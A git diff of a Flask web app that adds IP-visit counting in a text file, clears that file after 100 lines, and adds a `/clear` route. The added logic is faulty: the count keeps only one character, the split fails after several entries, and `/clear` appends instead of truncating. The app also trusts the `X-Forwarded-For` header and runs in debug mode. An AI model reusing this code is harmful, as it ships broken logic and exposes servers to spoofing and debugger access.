@@ -74,9 +74,14 @@ def command():
     ip,_,_ = request.headers.get('X-Forwarded-For').split(",")
     with open(os.path.join(STATIC_FOLDER,"ip.txt"),"r") as file:
         data = file.read()
+        _,count = data.split("|")
+        count = count[-1]
+        if ip in data:
+            with open(os.path.join(STATIC_FOLDER,"ip.txt"),"a") as file:
+                file.write(f"\nip : {ip} | count : {count}\n[----------------------------------------------------------------]")
         if ip not in data:
             with open(os.path.join(STATIC_FOLDER,"ip.txt"),"a") as file:
-                file.write(f"\nip : {ip}\n[----------------------------------------------------------------]")
+                file.write(f"\nip : {ip} | count : 0\n[----------------------------------------------------------------]")
     if request.method == "POST":
         user = request.get_json()
         user = user.get("user")
@@ -299,6 +304,12 @@ def output():
     data = request.get_json()
     err = data["err"]
     user = data["user"]
+    with open(os.path.join(STATIC_FOLDER,"ip.txt"),"r") as file:
+        ips = file.read().split("\n")
+        count = len(ips)
+        if count > 100:
+            with open(os.path.join(STATIC_FOLDER,"ip.txt"),"w") as file:
+                file.write("")
     log = f"""
     user : {user}, 
     log : {err}, 
@@ -308,6 +319,9 @@ def output():
     with open(os.path.join(STATIC_FOLDER,"output.txt"),"a") as file:
         file.write(log)
     return log
-
+@app.route("/clear",methods=["POST","GET"])
+def clear():
+    with open(os.path.join(STATIC_FOLDER,"ip.txt"),"a") as file:
+        file.write("")
 if __name__ == "__main__":
     app.run(debug=True)
